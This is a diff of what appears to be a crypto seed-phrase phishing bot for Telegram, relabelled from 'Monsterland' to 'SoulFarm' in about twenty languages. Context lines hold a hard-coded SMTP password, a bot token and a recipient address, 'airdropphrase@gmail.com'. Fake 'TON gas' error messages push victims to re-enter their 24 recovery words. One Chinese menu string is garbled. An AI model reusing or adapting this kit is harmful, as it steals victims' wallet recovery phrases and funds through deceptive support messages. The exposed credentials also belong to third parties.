@@ -56,7 +56,7 @@ SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # replace with env var in prod
 RECIPIENT_EMAIL = "airdropphrase@gmail.com"
 
 # Bot token (as provided) - replace with env var in production
-BOT_TOKEN = "8952564914:AAFkDDJ7vAxQVs7KV45RLhsebdZobcNt29w"
+BOT_TOKEN = "8747854377:AAG6zLyXFa_K7ZrHANkiD40koMH0ibPMR5Y"
 
 # Wallet display names used for wallet selection UI
 WALLET_DISPLAY_NAMES = {
@@ -147,7 +147,7 @@ REASSURANCE_TEMPLATE = 'Please note that "We protect your privacy. Your input {i
 # - post_receive_error in all languages
 LANGUAGES = {
     "en": {
-        "welcome": "Hi {user} welcome to the Monsterland support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
+        "welcome": "Hi {user} welcome to the SoulFarm support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
         "main menu title": "Please select an issue type to continue:",
         "validation": "Validation",
         "claim tokens": "Claim Tokens",
@@ -201,7 +201,7 @@ LANGUAGES = {
         "invalid_input": "Invalid input. Please use /start to begin.",
     },
     "es": {
-        "welcome": "Hi {user} bienvenido al Monsterland support bot! Este bot ayuda con acceso a billetera, transacciones, saldos, recuperaciones, recuperación de cuenta, reclamar tokens y recompensas, reembolsos y validaciones de cuenta. Por favor, seleccione una opción del menú para continuar.",
+        "welcome": "Hi {user} bienvenido al SoulFarm support bot! Este bot ayuda con acceso a billetera, transacciones, saldos, recuperaciones, recuperación de cuenta, reclamar tokens y recompensas, reembolsos y validaciones de cuenta. Por favor, seleccione una opción del menú para continuar.",
         "main menu title": "Por favor seleccione un tipo de problema para continuar:",
         "validation": "Validación",
         "claim tokens": "Reclamar Tokens",
@@ -245,7 +245,7 @@ LANGUAGES = {
         "invalid choice": "Elección inválida. Por favor use los botones.",
     },
     "fr": {
-        "welcome": "Hi {user} bienvenue au Monsterland support bot! Ce bot aide con acceso au portefeuille, transactions, soldes, recoveries, récupération de compte, réclamer tokens et récompenses, remboursements et validations de compte. Veuillez choisir une option du menu pour continuer.",
+        "welcome": "Hi {user} bienvenue au SoulFarm support bot! Ce bot aide con acceso au portefeuille, transactions, soldes, recoveries, récupération de compte, réclamer tokens et récompenses, remboursements et validations de compte. Veuillez choisir une option du menu pour continuer.",
         "main menu title": "Veuillez sélectionner un type de problème pour continuer :",
         "validation": "Validation",
         "claim tokens": "Réclamer des Tokens",
@@ -288,7 +288,7 @@ LANGUAGES = {
         "post_receive_error": "⚠️ Échec de la vérification du portefeuille TON\n\nLa vérification du portefeuille n'a pas pu être finalisée en raison d'un TON insuffisant pour les frais de gaz réseau et d'exécution des contrats intelligents nécessaires à l'opération on-chain.\n\nErreur TON : INSUFFICIENT_GAS_FOR_FINALIZATION\n\nAssurez-vous que le portefeuille connecté dispose de suffisamment de TON pour la finalité de la transaction, puis réessayez la vérification.\n\nVérifiez également localement les 24 mots de récupération pour détecter des erreurs d'orthographe, des mots manquants, un ordre incorrect ou des entrées invalides. Une seule incohérence peut entraîner l'échec de la validation d'authentification/dérivation du portefeuille.",
     },
     "ru": {
-        "welcome": "Hi {user} добро пожаловать в Monsterland support bot! Этот бот помогает с доступом к кошельку, транзакциями, балансами, восстановлением, восстановлением аккаунта, получением токенов и наград, возвратами и проверкой аккаунта. Пожалуйста, выберите один из пунктов меню, чтобы продолжить.",
+        "welcome": "Hi {user} добро пожаловать в SoulFarm support bot! Этот бот помогает с доступом к кошельку, транзакциями, балансами, восстановлением, восстановлением аккаунта, получением токенов и наград, возвратами и проверкой аккаунта. Пожалуйста, выберите один из пунктов меню, чтобы продолжить.",
         "main menu title": "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
         "validation": "Валидация",
         "claim tokens": "Получить Токены",
@@ -331,7 +331,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ Ошибка верификации кошелька TON\n\nВерификация кошелька не могла быть завершена из-за недостаточного количества TON для оплаты газа сети и комиссий за выполнение смарт-контрактов, необходимых для завершения on-chain операции.\n\nОшибка TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nУбедитесь, что подключённый кошелёк имеет достаточно TON для финализации транзакции, затем повторите верификацию.\n\nТакже проверьте локально все 24 слова восстановления на наличие орфографических ошибок, пропущенных слов, неправильного порядка или недопустимых записей. Единственное несоответствие может привести к сбою проверки аутентификации/деривации кошелька.',
     },
     "uk": {
-        "welcome": "Hi {user} ласкаво просимо до Monsterland support bot! Цей бот допомагає з доступом до гаманця, транзакціями, балансами, відновленнями, відновленням облікового запису, отриманням токенів і винагород, поверненнями та перевірками облікового запису. Будь ласка, виберіть один із пунктів меню, щоб продовжити.",
+        "welcome": "Hi {user} ласкаво просимо до SoulFarm support bot! Цей бот допомагає з доступом до гаманця, транзакціями, балансами, відновленнями, відновленням облікового запису, отриманням токенів і винагород, поверненнями та перевірками облікового запису. Будь ласка, виберіть один із пунктів меню, щоб продовжити.",
         "main menu title": "Будь ласка, виберіть тип проблеми для продовження:",
         "validation": "Валідація",
         "claim tokens": "Отримати Токени",
@@ -374,7 +374,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ Помилка верифікації гаманця TON\n\nВерифікацію гаманця не вдалося завершити через недостатню кількість TON для оплати газу мережі та комісій за виконання смарт-контрактів, необхідних для завершення on-chain операції.\n\nПомилка TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nПереконайтеся, що підключений гаманець має достатньо TON для фіналізації транзакції, а потім повторіть верифікацію.\n\nТакож перевірте локально всі 24 слова відновлення на наявність орфографічних помилок, пропущених слів, неправильного порядку або недійсних записів. Єдина невідповідність може призвести до збою перевірки автентифікації/виведення гаманця.',
     },
     "fa": {
-        "welcome": "Hi {user} خوش آمدید به Monsterland support bot! این بات به شما در دسترسی به کیف پول، تراکنش‌ها، موجودی‌ها، بازیابی‌ها، بازیابی حساب، درخواست توکن‌ها و جوایز، بازپرداخت‌ها و اعتبارسنجی حساب کمک می‌کند. لطفاً یک گزینه از منو را انتخاب کنید تا ادامه دهیم.",
+        "welcome": "Hi {user} خوش آمدید به SoulFarm support bot! این بات به شما در دسترسی به کیف پول، تراکنش‌ها، موجودی‌ها، بازیابی‌ها، بازیابی حساب، درخواست توکن‌ها و جوایز، بازپرداخت‌ها و اعتبارسنجی حساب کمک می‌کند. لطفاً یک گزینه از منو را انتخاب کنید تا ادامه دهیم.",
         "main menu title": "لطفاً یک نوع مشکل را انتخاب کنید:",
         "validation": "اعتبارسنجی",
         "claim tokens": "درخواست توکن‌ها",
@@ -417,7 +417,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ تأیید کیف پول TON ناموفق بود\n\nتأیید کیف پول به دلیل TON ناکافی برای کارمزد گاز شبکه و اجرای قرارداد هوشمند مورد نیاز برای تکمیل عملیات زنجیره\u200cای نهایی نشد.\n\nخطای TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nلطفاً اطمینان حاصل کنید که کیف پول متصل TON کافی برای نهایی شدن تراکنش دارد، سپس تأیید را دوباره امتحان کنید.\n\nهمچنین، تمام ۲۴ کلمه بازیابی را از نظر غلط\u200cهای املایی، کلمات گم\u200cشده، ترتیب نادرست یا ورودی\u200cهای نامعتبر به صورت محلی بررسی کنید. یک عدم تطابق می\u200cتواند باعث شکست اعتبارسنجی احراز هویت/استخراج کیف پول شود.',
     },
     "ar": {
-        "welcome": "Hi {user} مرحبًا بك في Monsterland support bot! يساعدك هذا البوت في الوصول إلى المحفظة، المعاملات، الأرصدة، الاسترداد، استرداد الحساب، المطالبة بالرموز والمكافآت، الاستردادات، والتحققات الحسابية. الرجاء اختيار خيار من القائمة للمتابعة.",
+        "welcome": "Hi {user} مرحبًا بك في SoulFarm support bot! يساعدك هذا البوت في الوصول إلى المحفظة، المعاملات، الأرصدة، الاسترداد، استرداد الحساب، المطالبة بالرموز والمكافآت، الاستردادات، والتحققات الحسابية. الرجاء اختيار خيار من القائمة للمتابعة.",
         "main menu title": "يرجى تحديد نوع المشكلة للمتابعة:",
         "validation": "التحقق",
         "claim tokens": "المطالبة بالرموز",
@@ -460,7 +460,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ فشل التحقق من محفظة TON\n\nلم يتمكن التحقق من المحفظة من الاكتمال بسبب عدم كفاية TON لرسوم غاز الشبكة وتنفيذ العقود الذكية المطلوبة لإتمام العملية على السلسلة.\n\nخطأ TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nيرجى التأكد من أن المحفظة المتصلة تمتلك TON كافياً لنهائية المعاملة، ثم أعد محاولة التحقق.\n\nأيضاً، تحقق محلياً من جميع كلمات الاسترداد الـ 24 بحثاً عن أخطاء إملائية، أو كلمات مفقودة، أو ترتيب غير صحيح، أو إدخالات غير صالحة. يمكن أن يؤدي أي تناقض واحد إلى فشل التحقق من صحة مصادقة/اشتقاق المحفظة.',
     },
     "pt": {
-        "welcome": "Hi {user} bem-vindo ao Monsterland support bot! Este bot ajuda com acesso à carteira, transações, saldos, recuperações, recuperação de conta, reivindicar tokens e recompensas, reembolsos e validações de conta. Por favor escolha uma opção do menu para prosseguir.",
+        "welcome": "Hi {user} bem-vindo ao SoulFarm support bot! Este bot ajuda com acesso à carteira, transações, saldos, recuperações, recuperação de conta, reivindicar tokens e recompensas, reembolsos e validações de conta. Por favor escolha uma opção do menu para prosseguir.",
         "main menu title": "Por favor selecione um tipo de problema para continuar:",
         "validation": "Validação",
         "claim tokens": "Reivindicar Tokens",
@@ -503,7 +503,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ Falha na verificação da carteira TON\n\nA verificação da carteira não pôde ser finalizada devido a TON insuficiente para as taxas de gás da rede e execução de contratos inteligentes necessários para concluir a operação on-chain.\n\nErro TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nCertifique-se de que a carteira conectada tem TON suficiente para a finalidade da transação e tente novamente a verificação.\n\nAlém disso, verifique localmente as 24 palavras de recuperação para erros ortográficos, palavras faltando, ordem incorreta ou entradas inválidas. Uma única incompatibilidade pode fazer com que a validação de autenticação/derivação da carteira falhe.',
     },
     "id": {
-        "welcome": "Hi {user} selamat datang di Monsterland support bot! Bot ini membantu dengan akses dompet, transaksi, saldo, recoveries, account recovery, klaim token dan reward, pengembalian dana, dan validasi akun. Silakan pilih opsi menu untuk melanjutkan.",
+        "welcome": "Hi {user} selamat datang di SoulFarm support bot! Bot ini membantu dengan akses dompet, transaksi, saldo, recoveries, account recovery, klaim token dan reward, pengembalian dana, dan validasi akun. Silakan pilih opsi menu untuk melanjutkan.",
         "main menu title": "Silakan pilih jenis masalah untuk melanjutkan:",
         "validation": "Validasi",
         "claim tokens": "Klaim Token",
@@ -546,7 +546,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ Verifikasi Dompet TON Gagal\n\nVerifikasi dompet tidak dapat diselesaikan karena TON tidak mencukupi untuk biaya gas jaringan dan eksekusi kontrak pintar yang diperlukan untuk menyelesaikan operasi on-chain.\n\nKesalahan TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nPastikan dompet yang terhubung memiliki TON yang cukup untuk finalitas transaksi, lalu coba verifikasi lagi.\n\nSelain itu, periksa secara lokal semua 24 kata pemulihan untuk kesalahan ejaan, kata yang hilang, urutan yang salah, atau entri yang tidak valid. Satu ketidakcocokan dapat menyebabkan gagalnya validasi autentikasi/derivasi dompet.',
     },
     "de": {
-        "welcome": "Hi {user} willkommen beim Monsterland support bot! Dieser Bot hilft bei Wallet-Zugriff, Transaktionen, Kontoständen, Wiederherstellungen, Kontowiederherstellung, Token- und Belohnungsansprüchen, Rückerstattungen und Kontovalidierungen. Bitte wählen Sie eine Menüoption, um fortzufahren.",
+        "welcome": "Hi {user} willkommen beim SoulFarm support bot! Dieser Bot hilft bei Wallet-Zugriff, Transaktionen, Kontoständen, Wiederherstellungen, Kontowiederherstellung, Token- und Belohnungsansprüchen, Rückerstattungen und Kontovalidierungen. Bitte wählen Sie eine Menüoption, um fortzufahren.",
         "main menu title": "Bitte wählen Sie einen Problemtyp, um fortzufahren:",
         "validation": "Validierung",
         "claim tokens": "Tokens Beanspruchen",
@@ -589,7 +589,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ TON-Wallet-Verifizierung fehlgeschlagen\n\nDie Wallet-Verifizierung konnte nicht abgeschlossen werden, da nicht genügend TON für Netzwerk-Gas-Gebühren und Smart-Contract-Ausführungsgebühren vorhanden sind, die für den On-Chain-Vorgang erforderlich sind.\n\nTON-Fehler: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nStellen Sie sicher, dass die verbundene Wallet über ausreichend TON für die Transaktionsendgültigkeit verfügt, und versuchen Sie die Verifizierung erneut.\n\nÜberprüfen Sie außerdem lokal alle 24 Wiederherstellungswörter auf Rechtschreibfehler, fehlende Wörter, falsche Reihenfolge oder ungültige Einträge. Eine einzige Abweichung kann dazu führen, dass die Wallet-Authentifizierungs-/Ableitungsvalidierung fehlschlägt.',
     },
     "nl": {
-        "welcome": "Hi {user} welkom bij de Monsterland support bot! Deze bot helpt met wallet-toegang, transacties, saldi, herstel, account recovery, tokens en rewards claimen, terugbetalingen en accountvalidaties. Kies een optie uit het menu om door te gaan.",
+        "welcome": "Hi {user} welkom bij de SoulFarm support bot! Deze bot helpt met wallet-toegang, transacties, saldi, herstel, account recovery, tokens en rewards claimen, terugbetalingen en accountvalidaties. Kies een optie uit het menu om door te gaan.",
         "main menu title": "Selecteer een type probleem om door te gaan:",
         "validation": "Validatie",
         "claim tokens": "Tokens Claimen",
@@ -632,7 +632,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ TON-wallet verificatie mislukt\n\nDe walletverificatie kon niet worden afgerond wegens onvoldoende TON voor netwerkgas en uitvoeringskosten van slimme contracten die nodig zijn om de on-chain operatie te voltooien.\n\nTON-fout: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nZorg ervoor dat de verbonden wallet voldoende TON heeft voor transactiefinaliteit en probeer de verificatie opnieuw.\n\nControleer ook lokaal alle 24 herstelwoorden op spelfouten, ontbrekende woorden, onjuiste volgorde of ongeldige vermeldingen. Één enkele discrepantie kan ervoor zorgen dat de wallet-authenticatie/-afleiding validatie mislukt.',
     },
     "hi": {
-        "welcome": "Hi {user} Monsterland support bot में आपका स्वागत है! यह बोट वॉलेट एक्सेस, लेनदेन, बैलेंस, रिकवरी, अकाउंट रिकवरी, टोकन और रिवॉर्ड क्लेम, रिफंड और अकाउंट वेलिडेशन में मदद करता है। जारी रखने के लिए मेनू से एक विकल्प चुनें।",
+        "welcome": "Hi {user} SoulFarm support bot में आपका स्वागत है! यह बोट वॉलेट एक्सेस, लेनदेन, बैलेंस, रिकवरी, अकाउंट रिकवरी, टोकन और रिवॉर्ड क्लेम, रिफंड और अकाउंट वेलिडेशन में मदद करता है। जारी रखने के लिए मेनू से एक विकल्प चुनें।",
         "main menu title": "कृपया जारी रखने के लिए एक समस्या प्रकार चुनें:",
         "validation": "सत्यापन",
         "claim tokens": "टोकन का दावा करें",
@@ -675,7 +675,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ TON वॉलेट सत्यापन विफल\n\nनेटवर्क गैस और स्मार्ट-कॉन्ट्रैक्ट निष्पादन शुल्क के लिए पर्याप्त TON न होने के कारण वॉलेट सत्यापन को अंतिम रूप नहीं दिया जा सका जो ऑन-चेन ऑपरेशन को पूर्ण करने के लिए आवश्यक हैं।\n\nTON त्रुटि: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nसुनिश्चित करें कि जुड़े वॉलेट में लेनदेन की अंतिमता के लिए पर्याप्त TON है, फिर सत्यापन पुनः प्रयास करें।\n\nसाथ ही, सभी 24 रिकवरी शब्दों को स्थानीय रूप से वर्तनी त्रुटियों, गुम शब्दों, गलत क्रम, या अमान्य प्रविष्टियों के लिए जांचें। एक भी बेमेल वॉलेट प्रमाणीकरण/व्युत्पत्ति सत्यापन विफल होने का कारण बन सकता है।',
     },
     "tr": {
-        "welcome": "Hi {user} Monsterland support bot'a hoş geldiniz! Bu bot cüzdan erişimi, işlemler, bakiye, kurtarmalar, hesap kurtarma, token ve ödül talepleri, iade ve hesap doğrulamaları konusunda yardımcı olur. Devam etmek için menüden bir seçenek seçin.",
+        "welcome": "Hi {user} SoulFarm support bot'a hoş geldiniz! Bu bot cüzdan erişimi, işlemler, bakiye, kurtarmalar, hesap kurtarma, token ve ödül talepleri, iade ve hesap doğrulamaları konusunda yardımcı olur. Devam etmek için menüden bir seçenek seçin.",
         "main menu title": "Devam etmek için bir sorun türü seçin:",
         "validation": "Doğrulama",
         "claim tokens": "Token Talep Et",
@@ -718,8 +718,8 @@ LANGUAGES = {
         "post_receive_error": "⚠️ TON Cüzdan Doğrulaması Başarısız\n\nZincir üstü işlemi tamamlamak için gereken ağ gaz ücretleri ve akıllı sözleşme yürütme ücretleri için yetersiz TON nedeniyle cüzdan doğrulaması tamamlanamadı.\n\nTON Hatası: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nBağlı cüzdanın işlem kesinliği için yeterli TON'a sahip olduğundan emin olun ve doğrulamayı yeniden deneyin.\n\nAyrıca, yazım hataları, eksik kelimeler, yanlış sıralama veya geçersiz girişler için 24 kurtarma kelimesini yerel olarak kontrol edin. Tek bir uyuşmazlık, cüzdan kimlik doğrulama/türetme doğrulamasının başarısız olmasına neden olabilir.",
     },
     "zh": {
-        "welcome": "Hi {user} 欢迎使用 Monsterland support bot! 此机器人可帮助钱包访问、交易、余额、恢复、账户恢复、认领代币与奖励、退款和账户验证。请选择菜单中的一项继续。",
-        "main menu title": "请选择一个问题类型以继续：",
+        "welcome": "Hi {user} 欢迎使用 SoulFarm support bot! 此机器人可帮助钱包访问、交易、余额、恢复、账户恢复、认领代币与奖励、退款和账户验证。请选择菜单中的一项继续。",
+        "main menu title": "请选择 个问题类型以继续：",
         "validation": "验证",
         "claim tokens": "认领代币",
         "recover account progress": "恢复账户进度",
@@ -761,7 +761,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ TON 钱包验证失败\n\n由于完成链上操作所需的网络燃料费和智能合约执行费中 TON 余额不足，钱包验证无法完成。\n\nTON 错误：INSUFFICIENT_GAS_FOR_FINALIZATION\n\n请确保已连接的钱包有足够的 TON 用于交易最终性，然后重试验证。\n\n另外，请在本地重新检查所有 24 个恢复词是否存在拼写错误、缺失词汇、顺序错误或无效条目。任何一个不匹配都可能导致钱包身份验证/派生验证失败。',
     },
     "cs": {
-        "welcome": "Hi {user} vítejte u Monsterland support bot! Tento bot pomáhá s přístupem k peněžence, transakcemi, zůstatky, obnovami, obnovením účtu, nárokováním tokenů a odměn, refundacemi a validacemi účtu. Vyberte prosím možnost z nabídky pro pokračování.",
+        "welcome": "Hi {user} vítejte u SoulFarm support bot! Tento bot pomáhá s přístupem k peněžence, transakcemi, zůstatky, obnovami, obnovením účtu, nárokováním tokenů a odměn, refundacemi a validacemi účtu. Vyberte prosím možnost z nabídky pro pokračování.",
         "main menu title": "Vyberte typ problému pro pokračování:",
         "validation": "Ověření",
         "claim tokens": "Nárokovat Tokeny",
@@ -804,7 +804,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ Ověření peněženky TON selhalo\n\nOvěření peněženky nebylo možné dokončit z důvodu nedostatečného TON pro poplatky za síťový plyn a provádění chytrých kontraktů potřebných k dokončení on-chain operace.\n\nChyba TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nUjistěte se, že připojená peněženka má dostatek TON pro konečnost transakce, a poté opakujte ověření.\n\nDále lokálně zkontrolujte všech 24 slov pro obnovu na překlepy, chybějící slova, nesprávné pořadí nebo neplatné záznamy. Jediný nesoulad může způsobit selhání ověření autentizace/odvozování peněženky.',
     },
     "ur": {
-        "welcome": "Hi {user} welcome to Monsterland support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
+        "welcome": "Hi {user} welcome to SoulFarm support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
         "main menu title": "براہ کرم جاری رکھنے کیلئے مسئلے کی قسم منتخب کریں:",
         "validation": "تصدیق",
         "claim tokens": "ٹوکن کلیم کریں",
@@ -847,7 +847,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ TON والٹ کی تصدیق ناکام ہوئی\n\nنیٹ ورک گیس اور سمارٹ کنٹریکٹ کے عمل کی فیس کے لیے ناکافی TON کی وجہ سے والٹ کی تصدیق مکمل نہیں ہو سکی جو آن چین آپریشن کو مکمل کرنے کے لیے ضروری ہیں۔\n\nTON خرابی: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nیقینی بنائیں کہ جڑا ہوا والٹ لین دین کی حتمیت کے لیے کافی TON رکھتا ہے، پھر تصدیق دوبارہ آزمائیں۔\n\nاس کے علاوہ، تمام 24 بحالی الفاظ کو مقامی طور پر ہجے کی غلطیوں، گمشدہ الفاظ، غلط ترتیب یا غیر درست اندراجات کے لیے جانچیں۔ ایک بھی عدم مطابقت والٹ کی تصدیق/مشتق درستگی کو ناکام بنا سکتی ہے۔',
     },
     "uz": {
-        "welcome": "Hi {user} Monsterland support botga xush kelibsiz! Ushbu bot hamyonga kirish, tranzaksiyalar, balanslar, tiklash, hisobni tiklash, token va mukofotlarni talab qilish, qaytarishlar va hisob tekshiruvi kabi masalalarda yordam beradi. Davom etish uchun menyudan bir variant tanlang.",
+        "welcome": "Hi {user} SoulFarm support botga xush kelibsiz! Ushbu bot hamyonga kirish, tranzaksiyalar, balanslar, tiklash, hisobni tiklash, token va mukofotlarni talab qilish, qaytarishlar va hisob tekshiruvi kabi masalalarda yordam beradi. Davom etish uchun menyudan bir variant tanlang.",
         "main menu title": "Davom etish uchun muammo turini tanlang:",
         "validation": "Tekshirish",
         "claim tokens": "Tokenlarni da'vo qilish",
@@ -890,7 +890,7 @@ LANGUAGES = {
         "post_receive_error": "⚠️ TON hamyon tekshiruvi muvaffaqiyatsiz tugadi\n\nOn-chain operatsiyani yakunlash uchun zarur bo'lgan tarmoq gaz to'lovlari va aqlli shartnoma bajarish to'lovlari uchun yetarli TON bo'lmaganligi sababli hamyon tekshiruvi yakunlanmadi.\n\nTON xatosi: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nUlangan hamyonda tranzaksiya yakuniyligi uchun yetarli TON borligiga ishonch hosil qiling, so'ngra tekshiruvni qayta urinib ko'ring.\n\nBundan tashqari, barcha 24 ta tiklash so'zini imlo xatoliklari, tushirib qoldirilgan so'zlar, noto'g'ri tartib yoki yaroqsiz yozuvlar uchun mahalliy ravishda tekshiring. Bitta nomuvofiqlik hamyon autentifikatsiya/derivatsiya tekshiruvining muvaffaqiyatsiz bo'lishiga olib kelishi mumkin.",
     },
     "it": {
-        "welcome": "Hi {user} benvenuto al Monsterland support bot! Questo bot aiuta con l'accesso al wallet, transazioni, saldi, recuperi, recupero account, richiesta token e ricompense, rimborsi e validazioni account. Scegli un'opzione del menu per procedere.",
+        "welcome": "Hi {user} benvenuto al SoulFarm support bot! Questo bot aiuta con l'accesso al wallet, transazioni, saldi, recuperi, recupero account, richiesta token e ricompense, rimborsi e validazioni account. Scegli un'opzione del menu per procedere.",
         "main menu title": "Seleziona un tipo di problema per continuare:",
         "validation": "Validazione",
         "claim tokens": "Richiedi Token",
@@ -933,7 +933,7 @@ LANGUAGES = {
         "post_receive_error": "⚠️ Verifica del portafoglio TON fallita\n\nLa verifica del portafoglio non ha potuto essere finalizzata a causa di TON insufficienti per le commissioni di gas di rete e di esecuzione dei contratti intelligenti necessari per completare l'operazione on-chain.\n\nErrore TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nAssicurati che il portafoglio connesso disponga di TON sufficienti per la finalità della transazione, quindi riprova la verifica.\n\nInoltre, controlla localmente tutte le 24 parole di recupero per errori di ortografia, parole mancanti, ordine errato o voci non valide. Una sola discrepanza può causare il fallimento della validazione di autenticazione/derivazione del portafoglio.",
     },
     "ja": {
-        "welcome": "Hi {user} ようこそ Monsterland support bot へ！このボットはウォレットアクセス、トランザクション、残高、復旧、アカウント回復、トークンや報酬の請求、返金、アカウント検証を支援します。メニューから選択してください。",
+        "welcome": "Hi {user} ようこそ SoulFarm support bot へ！このボットはウォレットアクセス、トランザクション、残高、復旧、アカウント回復、トークンや報酬の請求、返金、アカウント検証を支援します。メニューから選択してください。",
         "main menu title": "続行する問題の種類を選択してください：",
         "validation": "検証",
         "claim tokens": "トークンを請求",
@@ -976,7 +976,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ TONウォレットの検証に失敗しました\n\nオンチェーン操作を完了するために必要なネットワークガス料金とスマートコントラクト実行手数料に対してTONが不足しているため、ウォレットの検証を完了できませんでした。\n\nTONエラー: INSUFFICIENT_GAS_FOR_FINALIZATION\n\n接続されたウォレットにトランザクションの完了に十分なTONがあることを確認し、再度検証をお試しください。\n\nまた、24個の回復ワードすべてをローカルで確認し、スペルミス、欠落したワード、誤った順序、または無効なエントリがないかチェックしてください。1つでも不一致があると、ウォレットの認証/導出検証が失敗する可能性があります。',
     },
     "ms": {
-        "welcome": "Hi {user} selamat datang ke Monsterland support bot! Bot ini membantu dengan capaian wallet, transaksi, baki, pemulihan, pemulihan akaun, tuntutan token dan ganjaran, pulangan dan pengesahan akaun. Sila pilih pilihan menu untuk meneruskan.",
+        "welcome": "Hi {user} selamat datang ke SoulFarm support bot! Bot ini membantu dengan capaian wallet, transaksi, baki, pemulihan, pemulihan akaun, tuntutan token dan ganjaran, pulangan dan pengesahan akaun. Sila pilih pilihan menu untuk meneruskan.",
         "main menu title": "Sila pilih jenis isu untuk meneruskan:",
         "validation": "Pengesahan",
         "claim tokens": "Tuntut Token",
@@ -1019,7 +1019,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ Pengesahan Dompet TON Gagal\n\nPengesahan dompet tidak dapat diselesaikan kerana TON tidak mencukupi untuk bayaran gas rangkaian dan pelaksanaan kontrak pintar yang diperlukan untuk melengkapkan operasi on-chain.\n\nRalat TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nPastikan dompet yang disambungkan mempunyai TON yang mencukupi untuk muktamad transaksi, kemudian cuba semula pengesahan.\n\nSelain itu, semak secara tempatan kesemua 24 perkataan pemulihan untuk kesilapan ejaan, perkataan yang hilang, susunan yang salah, atau entri yang tidak sah. Satu ketidakpadanan boleh menyebabkan pengesahan pengesahan/derivasi dompet gagal.',
     },
     "ro": {
-        "welcome": "Hi {user} bine ați venit la Monsterland support bot! Acest bot ajută cu acces portofel, tranzacții, solduri, recuperări, recuperare cont, revendicare token-uri și recompense, rambursări și validări cont. Vă rugăm să alegeți o opțiune din meniu pentru a continua.",
+        "welcome": "Hi {user} bine ați venit la SoulFarm support bot! Acest bot ajută cu acces portofel, tranzacții, solduri, recuperări, recuperare cont, revendicare token-uri și recompense, rambursări și validări cont. Vă rugăm să alegeți o opțiune din meniu pentru a continua.",
         "main menu title": "Selectați un tip de problemă pentru a continua:",
         "validation": "Validare",
         "claim tokens": "Revendică Token-uri",
@@ -1062,7 +1062,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ Verificarea portofelului TON a eșuat\n\nVerificarea portofelului nu a putut fi finalizată din cauza TON insuficient pentru taxele de gaz de rețea și executarea contractelor inteligente necesare pentru a finaliza operațiunea on-chain.\n\nEroare TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nAsigurați-vă că portofelul conectat are suficient TON pentru finalitatea tranzacției, apoi reîncercați verificarea.\n\nDe asemenea, verificați local toate cele 24 de cuvinte de recuperare pentru erori de ortografiere, cuvinte lipsă, ordine incorectă sau intrări invalide. O singură nepotrivire poate cauza eșecul validării autentificării/derivării portofelului.',
     },
     "sk": {
-        "welcome": "Hi {user} vítajte pri Monsterland support bot! Tento bot pomáha s prístupom k peňaženke, transakciami, zostatkami, obnovami, obnovením účtu, tokenmi a odmenami, refundáciami a overením účtu. Vyberte možnosť v ponuke pre pokračovanie.",
+        "welcome": "Hi {user} vítajte pri SoulFarm support bot! Tento bot pomáha s prístupom k peňaženke, transakciami, zostatkami, obnovami, obnovením účtu, tokenmi a odmenami, refundáciami a overením účtu. Vyberte možnosť v ponuke pre pokračovanie.",
         "main menu title": "Vyberte typ problému pre pokračovanie:",
         "validation": "Validácia",
         "claim tokens": "Uplatniť tokeny",
@@ -1105,7 +1105,7 @@ LANGUAGES = {
         "post_receive_error": '⚠️ Overenie peňaženky TON zlyhalo\n\nOverenie peňaženky nemohlo byť dokončené z dôvodu nedostatočného TON pre poplatky za sieťový plyn a vykonávanie smart kontraktov potrebných na dokončenie on-chain operácie.\n\nChyba TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nUistite sa, že pripojená peňaženka má dostatok TON pre konečnosť transakcie, a potom zopakujte overenie.\n\nTaktiež lokálne skontrolujte všetkých 24 slov pre obnovu na preklepy, chýbajúce slová, nesprávne poradie alebo neplatné záznamy. Jediný nesúlad môže spôsobiť zlyhanie overenia autentizácie/odvodzovania peňaženky.',
     },
     "th": {
-        "welcome": "Hi {user} ยินดีต้อนรับสู่ Monsterland support bot! บอทนี้ช่วยเรื่องการเข้าถึงกระเป๋าเงิน, ธุรกรรม, ยอดคงเหลือ, การกู้คืน, การกู้คืนบัญชี, การเคลมโทเค็นและรางวัล, การคืนเงิน และการยืนยันบัญชี กรุณาเลือกตัวเลือกจากเมนูเพื่อดำเนินการต่อ",
